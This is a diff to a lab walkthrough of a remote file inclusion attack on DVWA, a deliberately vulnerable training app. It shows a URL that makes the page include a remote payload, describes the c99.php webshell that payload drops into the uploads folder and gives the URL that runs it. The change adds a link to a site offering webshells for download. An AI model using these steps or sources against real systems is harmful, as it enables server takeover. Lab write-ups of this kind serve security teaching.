@@ -60,8 +60,6 @@ Second, the attacker, taking advantage of the file inclusion vulnerability, trie
     http://localhost/dvwa/vulnerabilities/fi/?page=http://localhost/payload/payload.php
 
 
-Third, after the payload is executed, on the server of the vulnerable site in the directory "`/var/www/html/dvwa/hackable/uploads/`" a directory "`webshell`" is created where a file "`c99.php`" is downloaded - our webshell.
+Third, after the payload is executed, on the server of the vulnerable site in the directory "`/var/www/html/dvwa/hackable/uploads/`" a directory "`webshell`" is created where a file "`c99.php`" is downloaded - our webshell. You can download multiple webshells from [here](https://www.r57shell.net/).
 
 Finally, since the webshell is now resident on the server, it can be executed directly using the following URL: `http://localhost/dvwa/hackable/uploads/webshell/c99.php`.
- 
-
